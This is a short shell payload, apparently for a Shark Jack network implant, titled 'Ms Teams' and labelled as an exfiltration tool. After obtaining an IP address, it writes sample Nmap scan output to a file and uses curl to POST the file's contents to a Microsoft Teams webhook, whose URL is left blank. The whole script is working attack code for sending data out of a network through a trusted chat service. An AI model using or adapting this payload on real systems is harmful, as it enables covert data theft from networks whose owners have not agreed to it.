#!/bin/sh
# Title:        Ms Teams
# Description:  Exfiltrate data with microsoft teams

# Author:       Jules Bozouklian - bozou_client
# Version:      1.0
# Category:     Exfiltrate
#
# LED SETUP (Magenta)... Setting logs and waiting for IP address from DHCP
# LED ATTACK (Yellow)... Send message
#

LOG_DIR=/root/loot/exfiltrate/ms-teams
TIMESTAMP=`date +"%Y-%m-%d"`

WEB_HOOK_URL=""


LED SETUP

NETMODE DHCP_CLIENT

# Make log file
mkdir -p $LOG_DIR
LOG_FILE=$TIMESTAMP"_$(find $LOG_DIR -type f | wc -l).log"
LOG="$LOG_DIR/$LOG_FILE"

# Wait until Shark Jack has an IP address
while [ -z "$IPADDR" ]; do sleep 1 && IPADDR=$(ifconfig eth0 | grep "inet addr"); done

LED ATTACK

# create a fake file to send
touch /root/test-file.txt
echo "Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-19 19:12 CET
Nmap scan report for scanme.nmap.org (45.33.32.156)
Host is up (0.15s latency).
Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f
Not shown: 995 closed tcp ports (conn-refused)" >> /root/test-file.txt


function sendToMsTeams() {
    curl -H 'Content-Type: application/json' -X POST -d "{'text': '$(printf '%s' $(cat /root/test-file.txt))'}" $WEB_HOOK_URL
}

sendToMsTeams

LED FINISH
